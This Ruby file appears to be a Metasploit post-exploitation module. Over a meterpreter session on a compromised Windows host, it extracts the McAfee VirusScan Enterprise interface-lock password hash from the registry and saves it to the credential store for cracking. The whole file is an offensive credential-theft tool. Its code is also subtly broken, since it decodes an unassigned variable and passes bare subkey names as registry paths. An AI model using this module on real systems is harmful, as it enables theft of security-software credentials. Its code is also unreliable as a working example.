##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'rex/proto/rfb'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(update_info(
      info,
      'Name'          => 'McAfee Virus Scan Enterprise Password Hashes Dump',
      'Description'   => %q(
        This module extracts the password hash from McAfee Virus Scan
        Enterprise used to lock down the user interface.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => [
        'Mike Manzotti <michelemanzotti[at]gmail.com>', # Metasploit module?
        'Maurizio inode Agazzini' # original research?
      ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def enum_vse_keys
    subkeys = []
    [
      'HKLM\\Software\\Wow6432Node\\McAfee\\DesktopProtection', # 64-bit
      'HKLM\\Software\\McAfee\\DesktopProtection' # 32-bit
    ].each do |key|
      subkeys |= registry_enumkeys(key)
    end
    subkeys.compact
  end

  def extract_hashes(keys)
    keys.each do |key|
      hash = registry_getvaldata(key, "UIPEx")
      if hash.empty?
        vprint_error("No McAfee password hash found in #{key}")
        return
      end

      # Base64 decode mcafee_hash
      mcafee_version = registry_getvaldata(key, "szProductVer")
      if mcafee_version.split(".")[0] == "8"
        mcafee_hash =  Rex::Text.to_hex(Rex::Text.decode_base64(mcafee_hash), "")
        print_good("McAfee v8 password hash => #{mcafee_hash}")
        hashtype = "dynamic_1405"
      elsif mcafee_version.split(".")[0] == "5"
        print_good("McAfee v5 password hash => #{mcafee_hash}")
        hashtype = "md5u"
      else
        print_status("Could not identify the version of McAfee - Assuming v8")
      end

      # report
      service_data = {
        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
        port: rport,
        service_name: 'McAfee',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      # Initialize Metasploit::Credential::Core object
      credential_data = {
        post_reference_name: refname,
        origin_type: :session,
        private_type: :password,
        private_data: mcafee_hash,
        session_id: session_db_id,
        jtr_format: hashtype,
        workspace_id: myworkspace_id,
        username: "null"
      }

      # Merge the service data into the credential data
      credential_data.merge!(service_data)

      # Create the Metasploit::Credential::Core object
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      create_credential_login(login_data.merge!(service_data))
    end
  end

  def run
    print_status("Checking McAfee password hash on #{sysinfo['Computer']} ...")

    vse_keys = enum_vse_keys
    if vse_keys.empty?
      print_error("McAfee Virus Scan Enterprise not installed or insufficient permissions")
      return
    end

    extract_hashes(vse_keys)
  end
end
